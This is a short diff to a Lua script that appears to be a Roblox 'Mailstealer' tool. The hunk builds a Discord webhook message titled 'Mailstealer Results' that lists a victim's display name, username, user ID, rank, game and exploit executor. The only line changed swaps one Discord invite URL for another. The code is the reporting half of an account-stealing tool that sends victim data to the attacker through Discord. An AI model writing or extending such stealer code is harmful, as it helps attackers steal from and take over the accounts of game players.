@@ -96,7 +96,7 @@ local msg = {
 	  {
 		["title"]= "`Mailstealer Results`",
 		["description"]= "**Data from the victim**\n**🧑Display Name: **".._G.PlrDisplayNameVictim.."\n**🧑Username: **".._G.PlrUserVictim.."\n**🧑User ID: **".._G.PlrUserIDVictim.."\n**🐱Rank: **".._G.CurrentRank.."\n**🎮Place: **".._G.GameIn.."**\n☠Executor: **"..getexploit(),
-		["url"]= "https://discord.gg/G9q3Vz5k",
+		["url"]= "https://discord.gg/tBKAnBUb",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
         ["url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1108821104853786785/cat.png",
